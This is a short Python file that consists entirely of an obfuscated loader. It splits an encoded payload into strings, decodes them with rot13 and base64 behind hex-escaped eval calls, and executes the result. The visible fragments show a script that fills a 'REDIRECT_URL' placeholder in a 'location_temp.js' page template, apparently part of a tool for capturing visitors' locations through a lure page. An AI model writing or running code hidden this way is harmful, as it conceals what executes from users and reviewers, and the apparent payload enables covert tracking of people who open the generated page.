import base64, codecs
magic = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoiIiIKUiA9ICdcMDMzWzMxbScgIyByZWQKRyA9ICdcMDMzWzMybScgIyBncmVlbgpDID0gJ1wwMzNbMzZtJyAjIGN5YW4KVyA9ICdcMDMzWz'
love = 'OgWlNtVlO3nTy0MDbXpzIxnKWyL3DtCFOcoaO1qPuUVPftW1feKFptXlOQVPftWlOSoaEypvOUEUWcqzHtEzyfMFOIHxjtBvNaVPftIlxXq2y0nPOipTIhXPq0MJ1joTS0MF9aMUWc'
god = 'dmUvanMvbG9jYXRpb25fdGVtcC5qcycsICdyJykgYXMganM6CglyZWFkZXIgPSBqcy5yZWFkKCkKCXVwZGF0ZSA9IHJlYWRlci5yZXBsYWNlKCdSRURJUkVDVF9VUkwnLCByZWRpcm'
destiny = 'IwqPxXPaqcqTtto3OyovtaqTIgpTkuqTHiM2ElnKMyY2cmY2kiL2S0nJ9hYzcmWljtW3paXFOuplOdp191pTEuqTH6Ptydp191pTEuqTHhq3WcqTHbqKOxLKEyXDbWVvVvPaOup3Z='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))